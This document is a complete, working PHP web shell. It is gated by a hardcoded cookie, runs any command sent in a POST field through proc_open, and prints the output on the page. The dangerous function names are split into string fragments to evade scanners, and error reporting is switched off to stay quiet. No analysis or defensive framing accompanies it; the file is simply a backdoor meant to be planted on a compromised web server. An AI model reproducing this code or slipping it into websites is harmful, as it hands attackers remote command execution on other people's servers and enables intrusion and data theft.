<?php

$cookie_name = "isi_sendiri";
$cookie_value = "isi_sendiri";

if (isset ($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === $cookie_value) {

?>

<?php
error_reporting(0);

if (!empty($_POST['cmd'])) {
    $a = "pro";
    $b = "c_";
    $c = "open";
    $func = $a.$b.$c;

    $descriptorspec = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w')
    );

    $process = $func($_POST['cmd'], $descriptorspec, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $d = "stream_";
        $e = "get";
        $f = "_contents";
        $data = $d.$e.$f;
        $ppp = $data($pipes[1]);
        $error_output = $data($pipes[2]);

        fclose($pipes[1]);
        fclose($pipes[2]);

        $value1 = "pro";
        $value2 = "c_c";
        $value3 = "lose";
        $valuate = $value1.$value2.$value3;
        $return_value = $valuate($process);
    }
}

echo "
<center>
<div class='mb-3'>
    <form method='POST'>
        <div class='input-group mb-3'>
            <input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'] ?? '', ENT_QUOTES, 'UTF-8')."' placeholder='ls -la'>
            <button class='btn btn-outline-light btn-sm' type='submit'><i class='tombol'>Gass Entod</i></button>
        </div>
    </form>
</center>";

if (isset($ppp)) {
    echo '
    <div class="container-fluid language-javascript">
        <div class="shell mb-3">
            <pre style="font-size:15px;"><gr>~</gr>$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($ppp, ENT_QUOTES, 'UTF-8').'</code></pre>
        </div>
      </div>';
} elseif ($_SERVER['REQUEST_METHOD'] == 'POST') {
    echo '
    <div class="container-fluid language-javascript">
        <div class="shell mb-3">
            <pre style="font-size:15px;"><code>'.htmlspecialchars($error_output, ENT_QUOTES, 'UTF-8').'</code></pre>
        </div>
    </div>';
}
?>

<?php

    exit();
}
?>

